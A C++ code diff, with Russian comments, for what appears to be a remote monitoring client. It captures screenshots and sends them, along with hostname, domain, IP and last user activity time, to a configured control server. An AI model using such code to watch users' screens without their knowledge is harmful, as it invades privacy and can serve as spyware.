@@ -9,12 +9,10 @@ using namespace std;
 
 string server_ip;
 int server_port;
-string host_ip;
 
 string screenshot_dir;
 string host_name;
 string host_domain_name;
-string lastActiveTime;
 TCPClient* client;
 
 map<string, string> conf;
@@ -25,8 +23,12 @@ void sendScreenshot() {
     string screen_path = scrsht.makeScreenshot(screenshot_dir);
     char* data = scrsht.screenshotToMemory(screen_path, &size);
     Sleep(2); client->sendMessage(to_string(size)); // отправили размер
-    Sleep(2); client->receiveMessage();             // получили размер
+    Sleep(2); auto msg = client->receiveMessage();             // получили размер
+    if (msg != to_string(size)) {
+        throw exception("");
+    }
     Sleep(2); client->sendMessage(data, size);      // отправили фото
+    Sleep(20);
     scrsht.freeMemory(data);                        // выгрузили из памяти фото
 }
 
@@ -37,13 +39,10 @@ void useConfig(string path) {
     server_ip = conf["control_server"].substr(0, conf["control_server"].find(":"));
     server_port = atoi(conf["control_server"].substr(conf["control_server"].find(":") + 1).c_str());
 
+    screenshot_dir = regex_replace(OS::getExecProgramPath(), regex("\\\w*\.exe"), conf["screenshot_dir"]);
 
-
-    screenshot_dir = conf["screenshot_dir"];
     host_name = OS::getPCName();
     host_domain_name = OS::getPCDomain();
-    lastActiveTime = OS::getLastUserActivityTime();
-    host_ip = OS::getHostIp();
 
     if (host_domain_name.length() == 0) {
         host_domain_name = "no domain";
@@ -55,7 +54,7 @@ void sendState() {
     info += "hostname: " + host_name + "\n";
     info += "domain: " + host_domain_name + "\n";
     info += "last_activ_time: " + OS::getLastUserActivityTime() + "\n";
-    info += "ip: " + host_ip + "\n";
+    info += "ip: " + OS::getHostIp() + "\n";
     client->sendMessage(info);
 }
 
